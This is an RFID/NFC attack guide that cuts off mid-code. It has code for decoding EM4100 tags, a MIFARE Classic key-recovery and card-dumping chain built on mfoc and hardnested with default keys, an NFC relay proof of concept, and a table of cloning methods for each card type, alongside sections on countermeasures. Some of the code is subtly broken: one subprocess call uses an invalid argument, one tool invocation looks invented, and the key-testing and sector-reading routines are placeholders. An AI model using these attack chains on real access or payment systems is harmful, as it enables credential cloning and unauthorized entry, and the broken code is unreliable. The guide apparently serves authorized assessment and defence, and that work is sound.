# RFID/NFC Protocol Analysis and Attack Deep Dive Guide

## Introduction

Radio-Frequency Identification (RFID) and Near-Field Communication (NFC) technologies are embedded in billions of devices worldwide, from building access cards and payment terminals to transit passes and electronic passports. These systems operate at two primary frequency bands: Low Frequency (LF) at 125-134 kHz for legacy access control, and High Frequency (HF) at 13.56 MHz for modern NFC applications. While NFC adds interactive capabilities on top of the HF RFID physical layer, both technologies share fundamental vulnerabilities at the radio level that make them targets for security assessment.

This guide provides a comprehensive deep dive into RFID and NFC protocol analysis using Software Defined Radio equipment, focusing on the radio physical layer that complements the protocol-layer analysis covered in the main RFID/RF replay attack guide. We examine MIFARE Classic and DESfire attack methodologies, NFC relay attack techniques, and cloning countermeasures from both offensive and defensive perspectives. The guide covers signal capture and analysis using HackRF One and RTL-SDR, protocol reverse engineering with Universal Radio Hacker (URH), and automated attack scripting using Python.

Security professionals assess RFID/NFC systems to evaluate physical access control security, test payment terminal implementations, verify transit system integrity, and assess electronic passport cloning resistance. All techniques described require explicit written authorization from the system owner and must be performed in controlled lab environments. Unauthorized interception or cloning of RFID/NFC credentials is illegal in most jurisdictions.

**Objectives**: Master RFID/NFC signal analysis at the radio physical layer, implement MIFARE Classic and DESfire attack chains, execute NFC relay attacks in lab environments, and evaluate cloning countermeasures.

## Part 1: RFID/NFC Signal Capture and Analysis

### LF RFID (125 kHz) Signal Analysis

Low-frequency RFID systems use 125-134 kHz carriers with amplitude-shift keying (ASK) modulation. The Proximity EM4100 and HID ProxCard II are the most common LF RFID protocols, both using simple Manchester encoding with no cryptographic protection.

```python
#!/usr/bin/env python3
"""LF RFID Signal Analysis - Decode 125 kHz ASK-modulated RFID signals.

Captures and decodes EM4100 format tags from raw I/Q samples
recorded at 125 kHz using an LF RFID antenna connected to HackRF.
"""

import numpy as np
import struct
import sys


class LFRFIDDecoder:
    """Decode EM4100 LF RFID signals from raw I/Q capture."""

    EM4100_HEADER = [1, 1, 1, 1, 1, 1, 1, 1, 1]  # 9-bit header

    def __init__(self, sample_file, sample_rate=406250):
        """Load raw I/Q samples from HackRF capture.

        Args:
            sample_file: Path to raw I/Q file (signed 8-bit interleaved)
            sample_rate: Sample rate used during capture
        """
        self.sample_rate = sample_rate
        raw = np.fromfile(sample_file, dtype=np.int8)
        # Convert interleaved I/Q to complex signal
        i_samples = raw[0::2].astype(np.float32) / 128.0
        q_samples = raw[1::2].astype(np.float32) / 128.0
        self.signal = i_samples + 1j * q_samples

    def extract_amplitude(self):
        """Extract AM envelope from the complex signal."""
        amplitude = np.abs(self.signal)
        return amplitude

    def detect_clock_rate(self, amplitude):
        """Detect the RFID clock rate from the amplitude envelope.

        EM4100 uses 64 carrier cycles per data bit at 125 kHz,
        giving a data rate of ~125000/64 = 1953 bits/sec.
        """
        # Normalize amplitude
        amp_norm = (amplitude - np.mean(amplitude)) / np.std(amplitude)
        amp_binary = (amp_norm > 0).astype(np.int8)

        # Find transitions to estimate bit period
        transitions = np.diff(amp_binary)
        transition_indices = np.where(transitions != 0)[0]

        if len(transition_indices) < 10:
            print("[!] Insufficient transitions detected")
            return None

        # Calculate intervals between transitions
        intervals = np.diff(transition_indices)

        # The most common interval should be half a bit period
        # (Manchester encoding has a transition at every bit center)
        hist, bin_edges = np.histogram(intervals, bins=50)
        peak_bin = np.argmax(hist)
        half_bit_samples = int((bin_edges[peak_bin] + bin_edges[peak_bin + 1]) / 2)
        bit_samples = half_bit_samples * 2

        bit_rate = self.sample_rate / bit_samples
        print(f"[*] Detected bit rate: {bit_rate:.0f} bps")
        print(f"[*] Samples per bit: {bit_samples}")

        return bit_samples

    def manchester_decode(self, amplitude, bit_samples):
        """Decode Manchester-encoded data from the amplitude envelope.

        Manchester encoding: transition low-to-high = 1, high-to-low = 0
        """
        # Normalize and binarize
        amp_norm = (amplitude - np.mean(amplitude)) / np.std(amplitude)
        amp_binary = (amp_norm > 0).astype(np.int8)

        # Sample at bit centers
        bits = []
        # Start from a random offset and look for the header pattern
        for i in range(0, len(amp_binary) - bit_samples, bit_samples):
            half = bit_samples // 2
            first_half = amp_binary[i:i + half]
            second_half = amp_binary[i + half:i + bit_samples]

            if len(first_half) == 0 or len(second_half) == 0:
                continue

            first_val = np.mean(first_half) > 0.5
            second_val = np.mean(second_half) > 0.5

            if first_val and not second_val:
                bits.append(1)
            elif not first_val and second_val:
                bits.append(0)

        return bits

    def find_em4100_frame(self, bits):
        """Find and decode EM4100 frame in the bit stream.

        EM4100 format:
        - 9-bit header (all 1s)
        - 10 rows of 4 data bits + 1 even parity bit (50 bits)
        - 4 column parity bits + 1 stop bit (5 bits)
        Total: 64 bits
        """
        header_str = "".join(str(b) for b in self.EM4100_HEADER)

        # Slide through bits looking for header
        for i in range(len(bits) - 64):
            candidate_header = "".join(str(b) for b in bits[i:i + 9])

            if candidate_header == header_str:
                print(f"[*] EM4100 header found at bit position {i}")

                frame = bits[i + 9:i + 59]  # 50 data bits (10 rows x 5 bits)
                if len(frame) < 50:
                    continue

                # Verify row parity
                data_bits = []
                valid = True
                for row in range(10):
                    row_bits = frame[row * 5:(row + 1) * 5]
                    data = row_bits[:4]
                    parity = row_bits[4]
                    row_par = sum(data) % 2
                    if row_par != parity:
                        valid = False
                        break
                    data_bits.extend(data)

                if not valid:
                    continue

                # Extract the 40-bit ID
                # First 8 bits = customer/version code, next 32 bits = ID
                customer_code = int("".join(str(b) for b in data_bits[:8]), 2)
                card_id = int("".join(str(b) for b in data_bits[8:40]), 2)

                # Verify column parity
                col_parity = frame[50:54]
                stop_bit = frame[54] if len(frame) > 54 else None

                print(f"[+] EM4100 Tag Decoded Successfully")
                print(f"    Customer Code: {customer_code:02x}")
                print(f"    Card ID:       {card_id:010d}")
                print(f"    Hex ID:        {card_id:08x}")
                print(f"    Full Tag:      {customer_code:02x}{card_id:08x}")

                return {
                    "customer_code": customer_code,
                    "card_id": card_id,
                    "hex_id": f"{customer_code:02x}{card_id:08x}",
                    "valid": True
                }

        print("[!] No valid EM4100 frame found")
        return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 lf_rfid_decoder.py <iq_capture.raw> [sample_rate]")
        print("  Capture with: hackrf_transfer -r lf_rfid.raw -f 125000 -s 406250 -l 32 -g 20")
        sys.exit(1)

    decoder = LFRFIDDecoder(sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 406250)
    amplitude = decoder.extract_amplitude()
    bit_samples = decoder.detect_clock_rate(amplitude)

    if bit_samples:
        bits = decoder.manchester_decode(amplitude, bit_samples)
        print(f"[*] Decoded {len(bits)} bits")
        tag = decoder.find_em4100_frame(bits)
```

### HF RFID/NFC (13.56 MHz) Signal Capture

The 13.56 MHz band hosts NFC and HF RFID protocols including MIFARE, DESfire, NTAG, and ISO 15693. Signal capture at this frequency requires an HF antenna and careful gain configuration.

```bash
#!/bin/bash
# HF RFID/NFC Signal Capture and Analysis
# Captures 13.56 MHz NFC/RFID signals using HackRF

# Step 1: Capture NFC reader field and tag response
# The reader provides the carrier at 13.56 MHz with ASK modulation for commands
# Tags respond with load modulation (very weak signal)
echo "[*] Capturing HF RFID/NFC signals at 13.56 MHz..."

# Capture with HackRF - use appropriate antenna for 13.56 MHz
hackrf_transfer -r nfc_capture.raw \
  -f 13560000 \
  -s 8000000 \
  -l 32 \
  -g 20 \
  -n 160000000  # 20 seconds at 8 MSPS

echo "[+] Capture complete: nfc_capture.raw"

# Step 2: Analyze the capture with inspectrum
echo "[*] Opening in inspectrum for visual analysis..."
inspectrum nfc_capture.raw -r 8000000 --centre-frequency 13560000

# Step 3: Extract NFC Type A anticollision process
# When a reader polls for tags, it sends REQA/WUPA commands
# and tags respond with ATQA and UID during anticollision
echo ""
echo "[*] NFC Type A Anticollision Analysis"
echo "    Reader commands to look for:"
echo "    - REQA (0x26): Request any Type A tag"
echo "    - WUPA (0x52): Wake up any Type A tag"
echo "    - ANTICOLL (0x93): Select cascade level 1"
echo "    - SELECT (0x93 + UID + BCC): Select specific tag"
echo ""
echo "    Tag responses to look for:"
echo "    - ATQA (2 bytes): Answer to request"
echo "    - UID (4 or 7 bytes): Unique identifier"
echo "    - SAK (1 byte): Select acknowledge"

# Step 4: Use URH for protocol-level decoding
echo "[*] For protocol-level NFC analysis, use URH:"
echo "    urh nfc_capture.raw"
echo "    1. Set modulation to ASK"
echo "  2. Set sample rate to 8000000"
echo "    3. Use auto-detect to find signal boundaries"
echo "    4. Assign protocol labels for analysis"
```

## Part 2: MIFARE Classic Attack Methodology

### MIFARE Classic Architecture

MIFARE Classic tags use the proprietary CRYPTO1 stream cipher for authentication and encryption. The cipher was reverse-engineered in 2008, leading to practical attacks that recover keys in minutes. MIFARE Classic comes in 1K (16 sectors, 4 blocks each) and 4K (40 sectors) variants.

```python
#!/usr/bin/env python3
"""MIFARE Classic Attack Chain - Key recovery and data extraction.

This script demonstrates the MIFARE Classic attack methodology using
known vulnerabilities in the CRYPTO1 cipher. Requires an NFC reader
(e.g., ACR122U) connected to the system.

NOTE: This is for authorized security assessment only.
"""

import subprocess
import json
import sys
from collections import defaultdict


class MifareClassicAttacker:
    """MIFARE Classic attack chain for authorized security testing."""

    KNOWN_KEYS = {
        "default_keys": [
            "FFFFFFFFFFFF",  # Most common default key
            "000000000000",  # All zeros
            "A0A1A2A3A4A5",  # MIFARE MAD key
            "D3F7D3F7D3F7",  # NDEF key
            "B0B1B2B3B4B5",  # Another common key
            "4D3A99C351DD",  # Public transport key (varies)
            "1A2B3C4D5E6F",  # Common custom key
            "AABBCCDDEEFF",  # Sequential key
            "112233445566",  # Repeated pattern key
            "123456789ABC",  # Numeric sequence key
        ],
        "hardnested_reference": "Uses the hardnested attack to recover unknown keys from a known key"
    }

    def __init__(self, reader_device="/dev/ttyUSB0"):
        self.reader = reader_device
        self.recovered_keys = {}
        self.sector_data = {}

    def enumerate_reader(self):
        """Detect and enumerate connected NFC readers."""
        print("[*] Enumerating NFC readers...")

        # Use pcsc_scan to list connected readers
        result = subprocess.run(
            ["pcsc_scan", "-n"],
            capture_output=True, text=True, timeout=10
        )

        readers = []
        for line in result.stdout.split("\n"):
            if "reader" in line.lower():
                readers.append(line.strip())

        if readers:
            print(f"[+] Found {len(readers)} reader(s):")
            for r in readers:
                print(f"    {r}")
        else:
            print("[!] No NFC readers detected")

        return readers

    def check_tag_presence(self):
        """Check if a MIFARE Classic tag is present on the reader."""
        print("[*] Checking for MIFARE Classic tag...")

        # Use mfoc to detect tag type (mfoc will auto-detect)
        cmd = ["mfoc", "-P", "500", "-T", "1"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if "Mifare Classic" in result.stdout or "Found Mifare" in result.stdout:
            print("[+] MIFARE Classic tag detected")
            # Extract UID from output
            for line in result.stdout.split("\n"):
                if "UID" in line:
                    print(f"    {line.strip()}")
            return True
        else:
            print("[!] No MIFARE Classic tag found")
            return False

    def attack_default_keys(self):
        """Phase 1: Try all known default keys against all sectors."""
        print("\n[*] Phase 1: Default key attack...")
        print(f"    Testing {len(self.KNOWN_KEYS['default_keys'])} known keys")

        for sector in range(16):  # MIFARE Classic 1K has 16 sectors
            for key_type in ["A", "B"]:
                for key in self.KNOWN_KEYS["default_keys"]:
                    success = self._try_key(sector, key, key_type)
                    if success:
                        key_id = f"sector_{sector}_{key_type}"
                        self.recovered_keys[key_id] = key
                        print(f"    [+] Sector {sector} Key {key_type}: {key}")
                        break  # Move to next key type/sector

        print(f"\n[+] Recovered {len(self.recovered_keys)} keys")
        return self.recovered_keys

    def attack_nested_authentication(self):
        """Phase 2: Nested authentication attack.

        Uses a known key to derive unknown keys in other sectors
        through the nested authentication protocol vulnerability.
        """
        print("\n[*] Phase 2: Nested authentication attack...")

        if not self.recovered_keys:
            print("[!] No known keys - cannot perform nested attack")
            print("[!] Run default key attack first")
            return {}

        # Use mfoc for automated nested authentication attack
        cmd = [
            "mfoc",
            "-P", "500",     # Probe count
            "-T", "5",       # Tolerance
            "-O", "/tmp/mfoc_output.mfd",
            "-D", "/tmp/mfoc_dump.mfd"
        ]

        print("[*] Running mfoc nested authentication attack...")
        print("[*] This may take several minutes...")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                print("[+] mfoc completed successfully")
                print(f"[+] Card dump saved to /tmp/mfoc_dump.mfd")

                # Parse recovered keys from mfoc output
                for line in result.stdout.split("\n"):
                    if "Found Key" in line or "key" in line.lower():
                        print(f"    {line.strip()}")
            else:
                print(f"[!] mfoc failed: {result.stderr[:200]}")

        except subprocess.TimeoutExpired:
            print("[!] mfoc timed out after 5 minutes")

        return self.recovered_keys

    def attack_hardnested(self, known_sector, known_key, target_sector):
        """Phase 3: Hardnested attack for sectors with unknown keys.

        The hardnested attack exploits statistical biases in the
        CRYPTO1 keystream to recover keys even when no default keys work.
        Requires at least one known key (from any sector).
        """
        print(f"\n[*] Phase 3: Hardnested attack...")
        print(f"    Known: Sector {known_sector} key {known_key}")
        print(f"    Target: Sector {target_sector}")

        # Use MCT (Mifare Classic Tool) hardnested implementation
        cmd = [
            "hardnested",
            "--sector", str(known_sector),
            "--key", known_key,
            "--target-sector", str(target_sector),
            "--key-type", "A"
        ]

        print("[*] Running hardnested attack (may take 2-30 minutes)...")

        try:
            result = subprocess.run(cmd, coverage_output=True, text=True, timeout=1800)

            if "found key" in result.stdout.lower():
                print("[+] Key recovered via hardnested attack")
                for line in result.stdout.split("\n"):
                    if "key" in line.lower() and "0x" in line:
                        print(f"    {line.strip()}")
            else:
                print(f"[!] Hardnested did not find key")
                print(f"    Consider: more probes, different known sector, or offline attack")

        except subprocess.TimeoutExpired:
            print("[!] Hardnested timed out after 30 minutes")

    def extract_all_data(self):
        """Extract data from all accessible sectors using recovered keys."""
        print("\n[*] Extracting data from all accessible sectors...")

        for sector in range(16):
            for key_type in ["A", "B"]:
                key_id = f"sector_{sector}_{key_type}"
                if key_id in self.recovered_keys:
                    key = self.recovered_keys[key_id]
                    data = self._read_sector(sector, key, key_type)
                    if data:
                        self.sector_data[f"sector_{sector}"] = data
                        print(f"    [+] Sector {sector}: {len(data)} bytes read")

        print(f"\n[+] Total sectors extracted: {len(self.sector_data)}/16")
        return self.sector_data

    def analyze_extracted_data(self):
        """Analyze extracted MIFARE Classic data for sensitive information."""
        print("\n[*] Analyzing extracted data...")

        findings = []

        for sector_id, data in self.sector_data.items():
            sector_num = int(sector_id.split("_")[1])

            # Check block 0 for manufacturer data and UID
            if sector_num == 0 and len(data) >= 16:
                uid = data[:4].hex()
                bcc = data[4]
                sak = data[5]
                atqa = data[6:8].hex()
                findings.append({
                    "sector": sector_num,
                    "block": 0,
                    "type": "manufacturer_block",
                    "uid": uid,
                    "bcc": f"0x{bcc:02x}",
                    "sak": f"0x{sak:02x}",
                    "atqa": atqa
                })
                print(f"    [*] Manufacturer Block: UID={uid} SAK=0x{sak:02x} ATQA={atqa}")

            # Check for NDEF records (NFC Forum data)
            if any(b in data for b in [b'\x03', b'\xE1']):
                # Look for NDEF TLV
                for i in range(len(data) - 4):
                    if data[i] == 0x03:  # NDEF TLV tag
                        ndef_len = data[i + 1]
                        findings.append({
                            "sector": sector_num,
                            "type": "ndef_record",
                            "offset": i,
                            "length": ndef_len
                        })
                        print(f"    [*] NDEF record found in sector {sector_num} "
                              f"at offset {i}, length {ndef_len}")

            # Check sector trailer for access conditions
            if len(data) >= 48:  # 3 blocks + trailer
                trailer = data[48:64] if len(data) >= 64 else data[-16:]
                if len(trailer) >= 16:
                    key_a = trailer[:6].hex()
                    access_bits = trailer[6:9].hex()
                    user_data = trailer[9]
                    key_b = trailer[10:16].hex()
                    findings.append({
                        "sector": sector_num,
                        "type": "sector_trailer",
                        "key_a": key_a,
                        "access_bits": access_bits,
                        "key_b": key_b
                    })

        return findings

    def _try_key(self, sector, key, key_type):
        """Try authenticating to a sector with a specific key."""
        # Simulated - in practice would use libnfc or similar
        return False  # Placeholder

    def _read_sector(self, sector, key, key_type):
        """Read all blocks from a sector using the provided key."""
        # Simulated - in practice would use libnfc or similar
        return None  # Placeholder


if __name__ == "__main__":
    print("MIFARE Classic Attack Chain")
    print("=" * 50)
    print("NOTE: Requires NFC reader (ACR122U or compatible)")
    print("NOTE: Requires mfoc, hardnested tools installed")
    print()

    attacker = MifareClassicAttacker()
    attacker.enumerate_reader()

    if attacker.check_tag_presence():
        attacker.attack_default_keys()
        attacker.attack_nested_authentication()
        data = attacker.extract_all_data()
        findings = attacker.analyze_extracted_data()

        print(f"\n[+] Attack Summary:")
        print(f"    Keys recovered: {len(attacker.recovered_keys)}")
        print(f"    Sectors extracted: {len(attacker.sector_data)}")
        print(f"    Findings: {len(findings)}")
```

### MIFARE DESfire Attack Considerations

MIFARE DESfire uses AES or 3DES encryption, making it significantly more resistant than MIFARE Classic. However, implementation-level vulnerabilities can still be exploited.

```python
#!/usr/bin/env python3
"""MIFARE DESfire Security Assessment Framework.

DESfire (EV1/EV2/EV3) uses real encryption (AES/3DES) unlike
Classic's broken CRYPTO1. Assessment focuses on:
- Authentication protocol analysis
- Application directory enumeration
- Access control configuration review
- Key diversification testing
"""

DESFIRE_COMMANDS = {
    0x60: "GetVersion",
    0x6A: "Authenticate (DES)",
    0xAA: "Authenticate (AES)",
    0x6D: "GetApplicationIDs",
    0x6E: "SelectApplication",
    0x61: "GetFileIDs",
    0x6F: "GetFileSettings",
    0xBD: "ReadData",
    0x3D: "GetKeySettings",
    0x64: "ChangeKeySettings",
    0xC4: "ChangeKey",
    0x6C: "GetKeyVersion"
}


def assess_desfire_security():
    """Provide DESfire security assessment checklist."""
    print("MIFARE DESfire Security Assessment")
    print("=" * 60)

    assessment_items = [
        {
            "item": "Authentication Protocol Version",
            "check": "Verify DESfire EV2/EV3 with AES-128 (not EV1 with DES)",
            "risk": "EV1 with DES is vulnerable to offline brute force",
            "severity": "HIGH"
        },
        {
            "item": "Default Application Keys",
            "check": "Test for default master application key (all zeros or factory key)",
            "risk": "Default keys allow full card access",
            "severity": "CRITICAL"
        },
        {
            "item": "Key Diversification",
            "check": "Verify keys are diversified per-card using UID",
            "risk": "Non-diversified keys enable mass card cloning",
            "severity": "HIGH"
        },
        {
            "item": "Application Access Rights",
            "check": "Review access rights for each application on the card",
            "risk": "Overly permissive access rights allow data extraction",
            "severity": "MEDIUM"
        },
        {
            "item": "File Encryption",
            "check": "Verify file contents are encrypted, not just access-controlled",
            "risk": "Unencrypted files may be readable even without auth in some configs",
            "severity": "HIGH"
        },
        {
            "item": "Secure Messaging",
            "check": "Verify EV2+ secure messaging (CMAC + encryption) is enabled",
            "risk": "Without secure messaging, communication can be eavesdropped",
            "severity": "MEDIUM"
        },
        {
            "item": "Transaction MAC",
            "check": "Verify transaction MAC is enabled for financial applications",
            "risk": "Without transaction MAC, balance manipulation may be possible",
            "severity": "HIGH"
        },
        {
            "item": "Randomized UID",
            "check": "Verify card uses randomized UID (privacy mode)",
            "risk": "Static UID enables tracking and card identification",
            "severity": "LOW"
        }
    ]

    for item in assessment_items:
        print(f"\n  [{item['severity']}] {item['item']}")
        print(f"    Check: {item['check']}")
        print(f"    Risk:  {item['risk']}")

    # DESfire GetVersion command to identify card type
    print("\n\n[*] DESfire Card Identification")
    print("    Send GetVersion (0x60) command to identify:")
    print("    - Hardware version (EV1/EV2/EV3)")
    print("    - Firmware version")
    print("    - Batch number and serial number")
    print()
    print("    EV1: Supports DES, 2K3DES, AES-128")
    print("    EV2: Adds secure messaging, proximity check")
    print("    EV3: Adds random UID, transaction MAC, ECC")

    return assessment_items


if __name__ == "__main__":
    assess_desfire_security()
```

## Part 3: NFC Relay Attacks

### Relay Attack Concept

NFC relay attacks capture communication between a legitimate tag and reader, forwarding it in real-time to a remote location. This allows an attacker to use a victim's card without physical proximity. The attack exploits the fact that NFC readers cannot distinguish between a card physically present and a relayed signal.

```python
#!/usr/bin/env python3
"""NFC Relay Attack Proof of Concept (LAB ONLY).

Demonstrates the NFC relay attack concept using two NFC readers:
- Reader A (proxxy): Placed near the victim's card
- Reader B (leech):  Placed near the target reader

Communication is relayed between the two via a network connection.
This is a PROOF OF CONCEPT for educational purposes only.
"""

import socket
import threading
import time
import json
from datetime import datetime


class NFCRelayProxy:
    """Proxy component that sits near the victim's card.

    Emulates a reader to talk to the card, forwarding
    responses to the leech component over a network link.
    """

    def __init__(self, listen_port=8888):
        self.listen_port = listen_port
        self.running = False
        self.sessions = []

    def start(self):
        """Start the relay proxy listener."""
        self.running = True
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", self.listen_port))
        server.listen(1)
        server.settimeout(1)

        print(f"[*] NFC Relay Proxy listening on port {self.listen_port}")
        print("[*] Waiting for leech connection...")

        while self.running:
            try:
                client, addr = server.accept()
                print(f"[+] Leech connected from {addr}")

                handler = threading.Thread(
                    target=self._handle_relay_session,
                    args=(client,)
                )
                handler.daemon = True
                handler.start()

            except socket.timeout:
                continue
            except KeyboardInterrupt:
                break

        server.close()

    def _handle_relay_session(self, leech_socket):
        """Handle a relay session between leech and card.

        In a real attack, this would:
        1. Receive reader command from leech (network)
        2. Forward command to victim's card (NFC)
        3. Receive card response (NFC)
        4. Forward response to leech (network)
        """
        session_log = {
            "start_time": datetime.now().isoformat(),
            "transactions": []
        }

        try:
            while self.running:
                # Receive reader command from leech
                data = leech_socket.recv(4096)
                if not data:
                    break

                command_hex = data.hex()
                session_log["transactions"].append({
                    "direction": "reader_to_card",
                    "data": command_hex,
                    "timestamp": datetime.now().isoformat()
                })
                print(f"  [->] Reader command: {command_hex}")

                # SIMULATED: In a real relay, this would be forwarded
                # to the actual NFC card. Here we simulate a card response.
                # DO NOT use this for unauthorized access.

                # Simulated response (ATQA for MIFARE Classic)
                simulated_response = bytes([0x04, 0x00])
                leech_socket.send(simulated_response)

                session_log["transactions"].append({
                    "direction": "card_to_reader",
                    "data": simulated_response.hex(),
                    "timestamp": datetime.now().isoformat()
                })
                print(f"  [<-] Card response: {simulated_response.hex()}")

        except Exception as e:
            print(f"[-] Session error: {e}")
        finally:
            leech_socket.close()
            self.sessions.append(session_log)
            print(f"[*] Relay session ended. Transactions: {len(session_log['transactions'])}")


class NFCRelayLeech:
    """Leech component that sits near the target reader.

    Emulates a card to talk to the reader, forwarding
    commands to the proxy component over a network link.
    """

    def __init__(self, proxy_host, proxy_port=8888):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port

    def connect_to_proxy(self):
        """Connect to the relay proxy."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((self.proxy_host, self.proxy_port))
        print(f"[+] Connected to relay proxy at {self.proxy_host}:{self.proxy_port}")
        return sock

    def simulate_relay_timing(self):
        """Measure and report relay timing characteristics.

        Real NFC has timing requirements:
        - REQ/WUPA response: < 5 ms
        - Anticollision response: < 5 ms
        - SELECT response: < 5 ms
        - Authentication: < 50 ms

        Relay adds network latency which may cause timeouts.
        """
        print("\n[*] Relay Timing Analysis")
        print("    NFC Type A timing requirements:")
        print("    - Request guard time: 7.2 ms minimum")
        print("    - ATQA response: < 5 ms")
        print("    - Anticollision: < 5 ms per cascade level")
        print("    - Authentication: protocol-dependent")
        print()
        print("    Relay overhead estimation:")

        latencies = {
            "Local WiFi": "1-5 ms",
            "Internet (same city)": "10-30 ms",
            "Internet (cross-country)": "40-100 ms",
            "Cellular (4G)": "30-80 ms",
            "Cellular (5G)": "5-20 ms"
        }

        for link_type, latency in latencies.items():
            total_round_trip = latency
            feasible = "POSSIBLE" if "1-" in latency or "5-" in latency else "DIFFICULT"
            print(f"    {link_type}: {total_round_trip} RTT -> {feasible}")


def demonstrate_relay_defense():
    """Explain NFC relay attack defenses."""
    print("\n" + "=" * 60)
    print("NFC Relay Attack Countermeasures")
    print("=" * 60)

    defenses = [
        {
            "name": "Distance Bounding Protocol",
            "description": "Measure round-trip time of challenge-response to detect relay delays",
            "effectiveness": "HIGH",
            "implementation": "Requires reader-side modification with nanosecond-precision timers"
        },
        {
            "name": "Relay-Resistant Authentication",
            "description": "Use protocol features that detect relay (e.g., DESfire EV2 proximity check)",
            "effectiveness": "HIGH",
            "implementation": "Upgrade to DESfire EV2/EV3 with proximity checking enabled"
        },
        {
            "name": "Transaction Timeout",
            "description": "Enforce strict timing requirements that reject delayed responses",
            "effectiveness": "MEDIUM",
            "implementation": "Configure reader with aggressive timeout values"
        },
        {
            "name": "Multi-Factor Verification",
            "description": "Require additional authentication beyond NFC (PIN, biometric)",
            "effectiveness": "HIGH",
            "implementation": "Combine NFC with user interaction (PIN pad, biometric scanner)"
        },
        {
            "name": "Motion Detection",
            "description": "Card detects motion before allowing transaction",
            "effectiveness": "MEDIUM",
            "implementation": "Use cards with embedded accelerometers"
        }
    ]

    for defense in defenses:
        print(f"\n  [{defense['effectiveness']}] {defense['name']}")
        print(f"    {defense['description']}")
        print(f"    Implementation: {defense['implementation']}")


if __name__ == "__main__":
    print("NFC Relay Attack - Proof of Concept (LAB ONLY)")
    print("=" * 60)
    print()
    print("This demonstration shows the relay attack concept.")
    print("Two components are needed:")
    print("  1. Proxy: Near victim's card (emulates reader)")
    print("  2. Leech: Near target reader (emulates card)")
    print()

    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "proxy":
        proxy = NFCRelayProxy()
        proxy.start()
    elif len(sys.argv) > 1 and sys.argv[1] == "leech":
        host = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        leech = NFCRelayLeech(host)
        leech.simulate_relay_timing()
    else:
        print("Usage:")
        print("  python3 nfc_relay.py proxy          # Start proxy component")
        print("  python3 nfc_relay.py leech [host]   # Start leech component")
        demonstrate_relay_defense()
```

## Part 4: RFID/NFC Cloning Countermeasures

### Understanding Cloning Resistance

Not all RFID/NFC tags are equally cloneable. The cloning difficulty depends on the tag's authentication mechanism, encryption strength, and implementation quality.

```python
#!/usr/bin/env python3
"""RFID/NFC Cloning Resistance Assessment Framework.

Evaluates the cloning difficulty of various RFID/NFC technologies
and provides a structured assessment methodology.
"""

CLONING_RESISTANCE = {
    "EM4100": {
        "frequency": "125 kHz",
        "authentication": "None",
        "encryption": "None",
        "clone_difficulty": "TRIVIAL",
        "data_on_card": "40-bit read-only ID",
        "attack_time": "< 1 second (read + write to blank tag)",
        "countermeasure": "Replace with encrypted 13.56 MHz system (DESfire, SEOS)",
        "clone_method": "Read UID with any 125 kHz reader, write to writable EM4100 clone tag"
    },
    "HID ProxCard II": {
        "frequency": "125 kHz",
        "authentication": "None",
        "encryption": "None",
        "clone_difficulty": "TRIVIAL",
        "data_on_card": "up to 85-bit facility code + card number",
        "attack_time": "< 1 second",
        "countermeasure": "Migrate to HID iCLASS SE or multi-technology readers",
        "clone_method": "Read with Proxmark3 or dedicated HID reader, clone to T5577"
    },
    "MIFARE Classic 1K": {
        "frequency": "13.56 MHz",
        "authentication": "CRYPTO1 (broken)",
        "encryption": "CRYPTO1 stream cipher (broken)",
        "clone_difficulty": "EASY",
        "data_on_card": "1KB encrypted storage + 4/7-byte UID",
        "attack_time": "2-30 minutes (key recovery) + write",
        "countermeasure": "Upgrade to MIFARE DESfire EV2/EV3 with AES-128",
        "clone_method": "Recover keys with mfoc/hardnested, dump card, write to UID-changeable clone"
    },
    "MIFARE DESfire EV1": {
        "frequency": "13.56 MHz",
        "authentication": "3DES or AES-128",
        "encryption": "3DES / AES-128",
        "clone_difficulty": "MODERATE",
        "data_on_card": "2/4/8 KB encrypted application storage",
        "attack_time": "Depends on key management (days to infeasible)",
        "countermeasure": "Upgrade to EV2/EV3 with secure messaging and proximity check",
        "clone_method": "Cannot clone without knowing keys; focus on key extraction from reader"
    },
    "MIFARE DESfire EV2/EV3": {
        "frequency": "13.56 MHz",
        "authentication": "AES-128 with secure messaging",
        "encryption": "AES-128 + CMAC + secure channel",
        "clone_difficulty": "HARD",
        "data_on_card": "Up to 32KB with secure applications",
        "attack_time": "Currently infeasible without key compromise",
        "countermeasure": "Maintain proper key management and diversification",
        "clone_method": "No practical cloning attack; target key management instead"
    },
    "NTAG213/215/216": {
        "frequency": "13.56 MHz",
        "authentication": "Optional password protection",
        "encryption": "None (password is plaintext)",
        "clone_difficulty": "EASY to MODERATE",
        "data_on_card": "144/504/888 bytes + optional password",
        "attack_time": "< 1 second (no password) to hours (password brute force)",
        "countermeasure": "Use NTAG424 DNA with AES encryption",
        "clone_method": "Read with any NFC reader; UID can be cloned to magic tag"
    },
    "HID iCLASS": {
        "frequency": "13.56 MHz",
        "authentication": "Proprietary (key extracted in 2011)",
        "encryption": "DES / 3DES with custom cipher (weak)",
        "clone_difficulty": "EASY",
        "data_on_card": "Application areas with encrypted data",
        "attack_time": "Minutes using standard tools",
        "countermeasure": "Migrate to iCLASS SE with Secure Identity Object (SIO)",
        "clone_method": "Extract key, decrypt, clone to writable iCLASS tag"
    },
    "FIDO2/NFC Security Key": {
        "frequency": "13.56 MHz",
        "authentication": "ECDSA/ECDH with hardware-bound keys",
        "encryption": "Public key cryptography (private key never leaves device)",
        "clone_difficulty": "VERY HARD",
        "data_on_card": "Only public keys stored",
        "attack_time": "Currently infeasible",
        "countermeasure": "Already resistant; protect against supply chain attacks",
        "clone_method": "Private key is hardware-bound; cloning requires physical chip-level attack"
    }
}


def print_assessment_report():
    """Print the complete cloning resistance assessment."""
    print("=" * 70)
    print("RFID/NFC CLONING RESISTANCE ASSESSMENT")
    print("=" * 70)

    # Sort by difficulty
    difficulty_order = ["TRIVIAL", "EASY", "MODERATE", "HARD", "VERY HARD"]
    sorted_tags = sorted(
        CLONING_RESISTANCE.items(),
